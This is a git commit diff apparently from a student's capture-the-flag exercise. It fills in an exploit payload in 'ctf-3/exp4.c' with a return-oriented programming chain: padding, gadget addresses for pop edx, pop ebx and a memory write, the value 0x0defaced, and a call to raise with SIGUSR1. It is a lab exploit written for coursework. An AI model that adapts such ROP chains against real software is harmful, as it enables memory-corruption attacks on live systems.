9bd7f59481d41b96a6d383355cd66a06afaf6e05
ebielawa <edward_bielawa@brown.edu>
2022-11-06 18:08:44 -0500

    Flag 1 Test

--- ctf-3/exp4.c
+++ ctf-3/exp4.c
@@ -9,6 +9,18 @@
 #include <stdlib.h>
 #include <unistd.h>
 
+// Some addresses to remember:
+// rnd1: 0x0c88a004
+// rnd2: 0x0c88a008
+// mgk1: 0x0c88b008
+// mgk2: 0x0c88b00c
+
+// Pop the address of mgk1
+// Pop 0x0defaced
+// Mov defaced as an indirect write
+// Have a move that move ebx into address stored at edx
+// Call raise
+
 unsigned char payload[] =
 	/* ------------------------------------	*/
 	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
@@ -17,7 +29,14 @@ unsigned char payload[] =
 	/* ------------------------------------	*/
 	/* FIXME */
 	/* ------------------------------------	*/
-	"\xef\xbe\xad\xde";
+	"\x38\x71\x88\x0c"		// Address of pop edx gadget (0x0c887138)
+	"\x08\xb0\x88\x0c"		// Address of magic
+	"\x1e\x90\x04\x08"		// Address of pop ebx gadget (0x0804901e)
+	"\xed\xac\xef\x0d"		// 0x0defaced (in little endian)
+	"\x48\x71\x88\x0c"		// Address of mov ebx to [edx] (0x0c887148)
+	"\x30\x90\x04\x08"		// Address of raise in .plt (0x08049030)
+	"\xef\xbe\xad\xde"		// DEADBEEF (extra return address)
+	"\x0a\x00\x00\x00";		// SIGUSR1
 	/* ------------------------------------	*/
 
 
